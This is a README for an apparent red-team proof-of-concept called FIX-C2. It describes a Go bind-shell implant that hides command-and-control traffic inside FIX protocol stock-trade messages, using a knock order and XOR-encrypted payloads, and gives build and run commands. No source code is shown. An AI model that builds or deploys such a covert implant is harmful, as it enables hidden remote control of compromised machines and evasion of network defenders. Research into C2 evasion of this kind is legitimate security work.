# FIX-C2

This is a basic PoC bind shell that uses the Financial Information eXchange (FIX) protocol for disguising C2 traffic.

## Features

- FIX protocol-spec Logon, Logout, NewOrderSingle (market stock buy), and ExecutionReport messages
- C2 commands are embedded in stock trade requests sent to the executor (the C2 implant bind shell)
- C2 output is embedded in execution reports sent back to the trade client (the C2 "server")
- The executor listens for a specific "knock" trade order to begin receiving commands
- C2 payloads are XOR encrypted using the order/execution IDs sent with each command

Todo: some features like heartbeats and other details aren't implemented

## Build/Usage

Build executor:
```
go build executor.go
```

Build tradeclient:
```
go build tradeclient.go
```

Run executor bind shell (C2 implant):
```
./executor <port>
```

Run tradeclient (C2 "server", shell you send commands from):
```
./tradeclient <executor IP> <executor port>
```
